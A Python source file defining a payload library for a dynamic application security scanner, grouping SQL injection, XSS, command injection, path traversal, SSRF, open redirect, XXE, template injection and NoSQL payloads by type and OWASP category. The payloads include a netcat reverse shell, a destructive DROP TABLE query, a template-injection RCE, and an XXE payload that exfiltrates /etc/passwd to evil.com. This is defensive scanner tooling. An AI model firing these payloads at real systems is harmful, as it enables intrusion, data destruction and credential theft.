"""
DAST Payload Library
Comprehensive collection of payloads for dynamic application security testing
Includes OWASP Top 10 vulnerabilities and advanced attack vectors
"""

from typing import List, Dict, Any
from app.models.dast import DASTPayload, VulnerabilitySeverity

class DASTPayloadLibrary:
    """Comprehensive payload library for DAST testing"""
    
    @staticmethod
    def get_sql_injection_payloads() -> List[Dict[str, Any]]:
        """Get SQL injection payloads"""
        return [
            {
                "name": "Basic SQL Injection - OR 1=1",
                "vuln_type": "sqli",
                "payload": "' OR 1=1 --",
                "description": "Basic SQL injection to bypass authentication",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-89",
                "owasp_category": "A03:2021-Injection",
                "language": "sql"
            },
            {
                "name": "SQL Injection - UNION SELECT",
                "vuln_type": "sqli",
                "payload": "' UNION SELECT NULL,NULL,NULL--",
                "description": "UNION-based SQL injection for data extraction",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-89",
                "owasp_category": "A03:2021-Injection",
                "language": "sql"
            },
            {
                "name": "SQL Injection - Boolean Based",
                "vuln_type": "sqli",
                "payload": "' AND 1=1--",
                "description": "Boolean-based SQL injection",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-89",
                "owasp_category": "A03:2021-Injection",
                "language": "sql"
            },
            {
                "name": "SQL Injection - Time Based",
                "vuln_type": "sqli",
                "payload": "'; WAITFOR DELAY '00:00:05'--",
                "description": "Time-based SQL injection for blind detection",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-89",
                "owasp_category": "A03:2021-Injection",
                "language": "sql"
            },
            {
                "name": "SQL Injection - Stacked Queries",
                "vuln_type": "sqli",
                "payload": "'; DROP TABLE users--",
                "description": "Stacked queries for destructive operations",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-89",
                "owasp_category": "A03:2021-Injection",
                "language": "sql"
            }
        ]
    
    @staticmethod
    def get_xss_payloads() -> List[Dict[str, Any]]:
        """Get XSS payloads"""
        return [
            {
                "name": "Basic XSS - Script Tag",
                "vuln_type": "xss",
                "payload": "<script>alert('XSS')</script>",
                "description": "Basic reflected XSS using script tag",
                "severity": VulnerabilitySeverity.HIGH,
                "cwe_id": "CWE-79",
                "owasp_category": "A03:2021-Injection",
                "language": "javascript"
            },
            {
                "name": "XSS - Event Handler",
                "vuln_type": "xss",
                "payload": "<img src=x onerror=alert('XSS')>",
                "description": "XSS using event handler",
                "severity": VulnerabilitySeverity.HIGH,
                "cwe_id": "CWE-79",
                "owasp_category": "A03:2021-Injection",
                "language": "javascript"
            },
            {
                "name": "XSS - JavaScript URI",
                "vuln_type": "xss",
                "payload": "javascript:alert('XSS')",
                "description": "XSS using JavaScript URI scheme",
                "severity": VulnerabilitySeverity.HIGH,
                "cwe_id": "CWE-79",
                "owasp_category": "A03:2021-Injection",
                "language": "javascript"
            },
            {
                "name": "XSS - DOM Based",
                "vuln_type": "xss",
                "payload": "#<script>alert('XSS')</script>",
                "description": "DOM-based XSS using fragment identifier",
                "severity": VulnerabilitySeverity.HIGH,
                "cwe_id": "CWE-79",
                "owasp_category": "A03:2021-Injection",
                "language": "javascript"
            },
            {
                "name": "XSS - SVG",
                "vuln_type": "xss",
                "payload": "<svg onload=alert('XSS')>",
                "description": "XSS using SVG element",
                "severity": VulnerabilitySeverity.HIGH,
                "cwe_id": "CWE-79",
                "owasp_category": "A03:2021-Injection",
                "language": "javascript"
            }
        ]
    
    @staticmethod
    def get_command_injection_payloads() -> List[Dict[str, Any]]:
        """Get command injection payloads"""
        return [
            {
                "name": "Command Injection - Basic",
                "vuln_type": "cmdi",
                "payload": "; ls -la",
                "description": "Basic command injection to list files",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-78",
                "owasp_category": "A03:2021-Injection",
                "language": "shell"
            },
            {
                "name": "Command Injection - Sleep",
                "vuln_type": "cmdi",
                "payload": "; sleep 5",
                "description": "Time-based command injection detection",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-78",
                "owasp_category": "A03:2021-Injection",
                "language": "shell"
            },
            {
                "name": "Command Injection - Reverse Shell",
                "vuln_type": "cmdi",
                "payload": "; nc -e /bin/sh 192.168.1.100 4444",
                "description": "Command injection for reverse shell",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-78",
                "owasp_category": "A03:2021-Injection",
                "language": "shell"
            },
            {
                "name": "Command Injection - File Read",
                "vuln_type": "cmdi",
                "payload": "; cat /etc/passwd",
                "description": "Command injection to read system files",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-78",
                "owasp_category": "A03:2021-Injection",
                "language": "shell"
            },
            {
                "name": "Command Injection - Process List",
                "vuln_type": "cmdi",
                "payload": "; ps aux",
                "description": "Command injection to list processes",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-78",
                "owasp_category": "A03:2021-Injection",
                "language": "shell"
            }
        ]
    
    @staticmethod
    def get_path_traversal_payloads() -> List[Dict[str, Any]]:
        """Get path traversal payloads"""
        return [
            {
                "name": "Path Traversal - Basic",
                "vuln_type": "lfi",
                "payload": "../../../etc/passwd",
                "description": "Basic path traversal to read system files",
                "severity": VulnerabilitySeverity.HIGH,
                "cwe_id": "CWE-22",
                "owasp_category": "A01:2021-Broken Access Control",
                "language": "file"
            },
            {
                "name": "Path Traversal - Encoded",
                "vuln_type": "lfi",
                "payload": "..%2F..%2F..%2Fetc%2Fpasswd",
                "description": "URL-encoded path traversal",
                "severity": VulnerabilitySeverity.HIGH,
                "cwe_id": "CWE-22",
                "owasp_category": "A01:2021-Broken Access Control",
                "language": "file"
            },
            {
                "name": "Path Traversal - Double Encoded",
                "vuln_type": "lfi",
                "payload": "..%252F..%252F..%252Fetc%252Fpasswd",
                "description": "Double URL-encoded path traversal",
                "severity": VulnerabilitySeverity.HIGH,
                "cwe_id": "CWE-22",
                "owasp_category": "A01:2021-Broken Access Control",
                "language": "file"
            },
            {
                "name": "Path Traversal - Windows",
                "vuln_type": "lfi",
                "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "description": "Windows-style path traversal",
                "severity": VulnerabilitySeverity.HIGH,
                "cwe_id": "CWE-22",
                "owasp_category": "A01:2021-Broken Access Control",
                "language": "file"
            },
            {
                "name": "Path Traversal - Null Byte",
                "vuln_type": "lfi",
                "payload": "../../../etc/passwd%00",
                "description": "Path traversal with null byte injection",
                "severity": VulnerabilitySeverity.HIGH,
                "cwe_id": "CWE-22",
                "owasp_category": "A01:2021-Broken Access Control",
                "language": "file"
            }
        ]
    
    @staticmethod
    def get_ssrf_payloads() -> List[Dict[str, Any]]:
        """Get SSRF payloads"""
        return [
            {
                "name": "SSRF - AWS Metadata",
                "vuln_type": "ssrf",
                "payload": "http://169.254.169.254/latest/meta-data/",
                "description": "SSRF to access AWS metadata service",
                "severity": VulnerabilitySeverity.HIGH,
                "cwe_id": "CWE-918",
                "owasp_category": "A05:2021-Security Misconfiguration",
                "language": "http"
            },
            {
                "name": "SSRF - Azure Metadata",
                "vuln_type": "ssrf",
                "payload": "http://169.254.169.254/metadata/instance",
                "description": "SSRF to access Azure metadata service",
                "severity": VulnerabilitySeverity.HIGH,
                "cwe_id": "CWE-918",
                "owasp_category": "A05:2021-Security Misconfiguration",
                "language": "http"
            },
            {
                "name": "SSRF - GCP Metadata",
                "vuln_type": "ssrf",
                "payload": "http://metadata.google.internal/computeMetadata/v1/",
                "description": "SSRF to access GCP metadata service",
                "severity": VulnerabilitySeverity.HIGH,
                "cwe_id": "CWE-918",
                "owasp_category": "A05:2021-Security Misconfiguration",
                "language": "http"
            },
            {
                "name": "SSRF - Internal Network",
                "vuln_type": "ssrf",
                "payload": "http://192.168.1.1/",
                "description": "SSRF to access internal network",
                "severity": VulnerabilitySeverity.HIGH,
                "cwe_id": "CWE-918",
                "owasp_category": "A05:2021-Security Misconfiguration",
                "language": "http"
            },
            {
                "name": "SSRF - Localhost",
                "vuln_type": "ssrf",
                "payload": "http://localhost:8080/",
                "description": "SSRF to access localhost services",
                "severity": VulnerabilitySeverity.HIGH,
                "cwe_id": "CWE-918",
                "owasp_category": "A05:2021-Security Misconfiguration",
                "language": "http"
            }
        ]
    
    @staticmethod
    def get_open_redirect_payloads() -> List[Dict[str, Any]]:
        """Get open redirect payloads"""
        return [
            {
                "name": "Open Redirect - Basic",
                "vuln_type": "open_redirect",
                "payload": "https://evil.com",
                "description": "Basic open redirect to malicious site",
                "severity": VulnerabilitySeverity.MEDIUM,
                "cwe_id": "CWE-601",
                "owasp_category": "A01:2021-Broken Access Control",
                "language": "http"
            },
            {
                "name": "Open Redirect - Encoded",
                "vuln_type": "open_redirect",
                "payload": "https%3A%2F%2Fevil.com",
                "description": "URL-encoded open redirect",
                "severity": VulnerabilitySeverity.MEDIUM,
                "cwe_id": "CWE-601",
                "owasp_category": "A01:2021-Broken Access Control",
                "language": "http"
            },
            {
                "name": "Open Redirect - Double Encoded",
                "vuln_type": "open_redirect",
                "payload": "https%253A%252F%252Fevil.com",
                "description": "Double URL-encoded open redirect",
                "severity": VulnerabilitySeverity.MEDIUM,
                "cwe_id": "CWE-601",
                "owasp_category": "A01:2021-Broken Access Control",
                "language": "http"
            },
            {
                "name": "Open Redirect - Protocol Relative",
                "vuln_type": "open_redirect",
                "payload": "//evil.com",
                "description": "Protocol-relative open redirect",
                "severity": VulnerabilitySeverity.MEDIUM,
                "cwe_id": "CWE-601",
                "owasp_category": "A01:2021-Broken Access Control",
                "language": "http"
            },
            {
                "name": "Open Redirect - JavaScript",
                "vuln_type": "open_redirect",
                "payload": "javascript:window.location='https://evil.com'",
                "description": "JavaScript-based open redirect",
                "severity": VulnerabilitySeverity.MEDIUM,
                "cwe_id": "CWE-601",
                "owasp_category": "A01:2021-Broken Access Control",
                "language": "javascript"
            }
        ]
    
    @staticmethod
    def get_xxe_payloads() -> List[Dict[str, Any]]:
        """Get XXE payloads"""
        return [
            {
                "name": "XXE - File Read",
                "vuln_type": "xxe",
                "payload": """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>""",
                "description": "XXE to read system files",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-611",
                "owasp_category": "A05:2021-Security Misconfiguration",
                "language": "xml"
            },
            {
                "name": "XXE - SSRF",
                "vuln_type": "xxe",
                "payload": """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >]>
<foo>&xxe;</foo>""",
                "description": "XXE to perform SSRF",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-611",
                "owasp_category": "A05:2021-Security Misconfiguration",
                "language": "xml"
            },
            {
                "name": "XXE - Parameter Entity",
                "vuln_type": "xxe",
                "payload": """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?x=%file;'>">
%eval;
%exfil;]>
<data>test</data>""",
                "description": "XXE using parameter entities for data exfiltration",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-611",
                "owasp_category": "A05:2021-Security Misconfiguration",
                "language": "xml"
            }
        ]
    
    @staticmethod
    def get_template_injection_payloads() -> List[Dict[str, Any]]:
        """Get template injection payloads"""
        return [
            {
                "name": "Template Injection - Basic",
                "vuln_type": "template_injection",
                "payload": "{{7*7}}",
                "description": "Basic template injection test",
                "severity": VulnerabilitySeverity.HIGH,
                "cwe_id": "CWE-94",
                "owasp_category": "A03:2021-Injection",
                "language": "template"
            },
            {
                "name": "Template Injection - RCE",
                "vuln_type": "template_injection",
                "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "description": "Template injection for remote code execution",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-94",
                "owasp_category": "A03:2021-Injection",
                "language": "template"
            },
            {
                "name": "Template Injection - File Read",
                "vuln_type": "template_injection",
                "payload": "{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}",
                "description": "Template injection to read files",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-94",
                "owasp_category": "A03:2021-Injection",
                "language": "template"
            }
        ]
    
    @staticmethod
    def get_nosql_injection_payloads() -> List[Dict[str, Any]]:
        """Get NoSQL injection payloads"""
        return [
            {
                "name": "NoSQL Injection - Basic",
                "vuln_type": "nosql_injection",
                "payload": "' || '1'=='1",
                "description": "Basic NoSQL injection to bypass authentication",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-943",
                "owasp_category": "A03:2021-Injection",
                "language": "nosql"
            },
            {
                "name": "NoSQL Injection - MongoDB",
                "vuln_type": "nosql_injection",
                "payload": "admin' && '1'=='1",
                "description": "MongoDB-specific NoSQL injection",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-943",
                "owasp_category": "A03:2021-Injection",
                "language": "nosql"
            },
            {
                "name": "NoSQL Injection - JavaScript",
                "vuln_type": "nosql_injection",
                "payload": "'; return true; var x='",
                "description": "JavaScript-based NoSQL injection",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cwe_id": "CWE-943",
                "owasp_category": "A03:2021-Injection",
                "language": "nosql"
            }
        ]
    
    @staticmethod
    def get_all_payloads() -> List[Dict[str, Any]]:
        """Get all payloads from the library"""
        all_payloads = []
        
        # Add all payload types
        all_payloads.extend(DASTPayloadLibrary.get_sql_injection_payloads())
        all_payloads.extend(DASTPayloadLibrary.get_xss_payloads())
        all_payloads.extend(DASTPayloadLibrary.get_command_injection_payloads())
        all_payloads.extend(DASTPayloadLibrary.get_path_traversal_payloads())
        all_payloads.extend(DASTPayloadLibrary.get_ssrf_payloads())
        all_payloads.extend(DASTPayloadLibrary.get_open_redirect_payloads())
        all_payloads.extend(DASTPayloadLibrary.get_xxe_payloads())
        all_payloads.extend(DASTPayloadLibrary.get_template_injection_payloads())
        all_payloads.extend(DASTPayloadLibrary.get_nosql_injection_payloads())
        
        return all_payloads
    
    @staticmethod
    def get_payloads_by_type(vuln_type: str) -> List[Dict[str, Any]]:
        """Get payloads by vulnerability type"""
        payload_methods = {
            "sqli": DASTPayloadLibrary.get_sql_injection_payloads,
            "xss": DASTPayloadLibrary.get_xss_payloads,
            "cmdi": DASTPayloadLibrary.get_command_injection_payloads,
            "lfi": DASTPayloadLibrary.get_path_traversal_payloads,
            "ssrf": DASTPayloadLibrary.get_ssrf_payloads,
            "open_redirect": DASTPayloadLibrary.get_open_redirect_payloads,
            "xxe": DASTPayloadLibrary.get_xxe_payloads,
            "template_injection": DASTPayloadLibrary.get_template_injection_payloads,
            "nosql_injection": DASTPayloadLibrary.get_nosql_injection_payloads
        }
        
        if vuln_type in payload_methods:
            return payload_methods[vuln_type]()
        
        return []
    
    @staticmethod
    def get_payloads_by_severity(severity: VulnerabilitySeverity) -> List[Dict[str, Any]]:
        """Get payloads by severity level"""
        all_payloads = DASTPayloadLibrary.get_all_payloads()
        return [payload for payload in all_payloads if payload["severity"] == severity]
    
    @staticmethod
    def get_owasp_top_10_payloads() -> List[Dict[str, Any]]:
        """Get payloads covering OWASP Top 10 vulnerabilities"""
        owasp_payloads = []
        
        # A01:2021 - Broken Access Control
        owasp_payloads.extend(DASTPayloadLibrary.get_path_traversal_payloads())
        owasp_payloads.extend(DASTPayloadLibrary.get_open_redirect_payloads())
        
        # A02:2021 - Cryptographic Failures
        # (Handled by passive scanning for HTTPS, weak algorithms, etc.)
        
        # A03:2021 - Injection
        owasp_payloads.extend(DASTPayloadLibrary.get_sql_injection_payloads())
        owasp_payloads.extend(DASTPayloadLibrary.get_xss_payloads())
        owasp_payloads.extend(DASTPayloadLibrary.get_command_injection_payloads())
        owasp_payloads.extend(DASTPayloadLibrary.get_template_injection_payloads())
        owasp_payloads.extend(DASTPayloadLibrary.get_nosql_injection_payloads())
        
        # A04:2021 - Insecure Design
        # (Handled by business logic testing)
        
        # A05:2021 - Security Misconfiguration
        owasp_payloads.extend(DASTPayloadLibrary.get_ssrf_payloads())
        owasp_payloads.extend(DASTPayloadLibrary.get_xxe_payloads())
        
        # A06:2021 - Vulnerable and Outdated Components
        # (Handled by component analysis)
        
        # A07:2021 - Identification and Authentication Failures
        # (Handled by authentication testing)
        
        # A08:2021 - Software and Data Integrity Failures
        # (Handled by integrity checks)
        
        # A09:2021 - Security Logging and Monitoring Failures
        # (Handled by logging analysis)
        
        # A10:2021 - Server-Side Request Forgery
        owasp_payloads.extend(DASTPayloadLibrary.get_ssrf_payloads())
        
        return owasp_payloads 